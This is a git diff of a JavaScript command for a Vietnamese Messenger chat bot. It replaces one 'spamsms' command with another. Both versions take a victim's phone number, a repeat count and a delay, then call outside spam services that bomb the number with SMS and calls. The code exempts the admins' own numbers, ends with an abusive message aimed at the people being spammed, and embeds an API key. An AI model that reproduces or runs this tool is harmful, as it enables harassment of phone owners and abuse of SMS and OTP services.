@@ -1,56 +1,87 @@
-const axios = require('axios')
-
-module.exports = {
-  config: {
-    name: "spamsms",
-  version: "1.0.0",
-  hasPermission: 2,
-  credits: "L.V. Bằng",
-  description: "Spam sms + call",
-  usePrefix: true,
-  usages: "",
-  commandCategory: "Admin",
-  cooldowns: 0,
-  },
-
-  run: async function({ args, event, api }) {
-    const { sendMessage } = api;
-    const { threadID: tid, messageID: mid } = event;
-    const forbiddenPhone = ['0343445450', '0399526331'];
-    const sdt = args[0];
-    if (!sdt || sdt.length !== 10 || !sdt.startsWith('0')) {
-return sendMessage('Vui lòng nhập sdt\n📍 Ví dụ:\n🧪 Spam 0909090908 1 1\n⚡ Số lượt trc dộ delay sau',event.threadID, event.messageID)
-    } else if (forbiddenPhone.includes(sdt)) {
-      return sendMessage('Spam con cặt!', tid, mid);
-    }
-    const luot = args[1];
-    if (luot > 200) {
-      return sendMessage('Số lượt phải bé hơn 200', tid, mid);
-    }
-    const delay = args[2];
-    if (delay < 1 || delay > 500) {
-      return sendMessage('Delay phải lớn hơn 0 và bé hơn 500', tid, mid);
-    }
-    if (args.length !== 3) {
-      return sendMessage('Vui lòng nhập đúng định dạng <sdt> <lượt> <delay>!\nEx: 033xxxxxxx 1 15')
-    }
-    sendMessage(`Đang tiến hành spam sđt: ${sdt}
-Số lượt: ${luot}
-Delay: ${delay}`, tid, mid);
-    const start = Date.now();
-const { totalCallApi, success, fail } = ( await axios.get('https://spam-1.qvapi.repl.co/spam?sdt=' + sdt + '&luot=' + luot + '&delay=' + delay)).data;
-    return sendMessage(`Trạng thái: Thành công!
-────────────────
-Số luợt: ${luot} lượt
-────────────────
-Số lượt call api: ${totalCallApi} lượt
-────────────────
-Thành công: ${success} lượt
-────────────────
-Thất bại: ${fail} lượt
-────────────────
-Thời gian xử lí: ${((Date.now() - start) / 1000).toFixed(1)} giây
-────────────────
-FUCKYOU MẤY ĐỨA BỊ SPAM`, tid, mid);
-  }
-}
+module.exports.config = {
+  name: "spamsms",
+  version: "1.0.5",
+  hasPermssion: 2,
+  credits: "Dũngkon",
+  description: "Spam sms hoặc call",
+  commandCategory: "Spam",
+  usages: "spam sđt | số lần | time delay",
+  cooldowns: 5,
+};
+module.exports.run = async function ({ api, event, args, Currencies, Users }) {
+  if (this.config.credits !== "Dũngkon")
+    return api.sendMessage(
+      "Đã bảo đừng thay credits rồi mà không nghe, thay lại credits ngay không là đéo dùng được đâu nha",
+      event.threadID,
+      event.messageID
+    );
+  var data = await Currencies.getData(event.senderID);
+  const axios = require("axios");
+  var list_id = [];
+  const sdt = args
+    .join(" ")
+    .trim()
+    .replace(/\s+/g, " ")
+    .replace(/(\s+\|)/g, "|")
+    .replace(/\|\s+/g, "|")
+    .split("|")[0];
+  const solan = args
+    .join(" ")
+    .trim()
+    .replace(/\s+/g, " ")
+    .replace(/(\s+\|)/g, "|")
+    .replace(/\|\s+/g, "|")
+    .split("|")[1];
+  const delay = args
+    .join(" ")
+    .trim()
+    .replace(/\s+/g, " ")
+    .replace(/(\s+\|)/g, "|")
+    .replace(/\|\s+/g, "|")
+    .split("|")[2];
+  if (!sdt)
+    return api.sendMessage(
+      `⚠️ Thiếu số điện thoại\n📝 Vui lòn nhập theo định dạng\n${global.config.PREFIX}spamsms số điện thoại | số lần | delay`,
+      event.threadID,
+      event.messageID
+    );
+  if (!solan)
+    return api.sendMessage(
+      `⚠️ Thiếu số lần\n📝 Vui lòn nhập theo định dạng\n${global.config.PREFIX}spamsms số điện thoại | số lần | delay`,
+      event.threadID,
+      event.messageID
+    );
+  if (!delay)
+    return api.sendMessage(
+      `⚠️ Thiếu time delay\n📝 Vui lòn nhập theo định dạng\n${global.config.PREFIX}spamsms số điện thoại | số lần | delay`,
+      event.threadID,
+      event.messageID
+    );
+  if (solan > 100 || solan == 101)
+    return api.sendMessage("⚠️ Số lần không được quá 100 lần", event.threadID);
+  if (sdt == 0368269220)
+    return api.sendMessage(
+      "⚠️ Không thể spam số này vì đây là số của admin",
+      event.threadID
+    );
+  api.sendMessage(
+    `🔄 Đang tiến hành spam\n📱Số điện thoại: ${sdt}\n🔢 Số lần: ${solan}\n⏰ Time delay: ${delay}\n👤 Người thực thi lệnh: ${
+      (await Users.getData(event.senderID)).name
+    }`,
+    event.threadID
+  );
+  var data = await global.utils.getContent(
+    `https://spam.dungkon.me/spam?sdt=${sdt}&luot=${solan}&delay=${delay}&apikey=niiozic`
+  );
+  console.log(data);
+  if (data == null) return;
+  let noti = data.data.message;
+  let tong = data.data.totalCallApi;
+  let thanhcong = data.data.success;
+  let thatbai = data.data.fail;
+  let soluot = data.data.soluot;
+  return api.sendMessage(
+    `📝 Trạng thái: ${noti}\n✏️ Tổng: ${tong}\n✅ Thành công: ${thanhcong}\n❎ Thất bại: ${thatbai}\n🔢 Số lượt: ${soluot}\nTime delay: ${delay}`,
+    event.threadID
+  );
+};
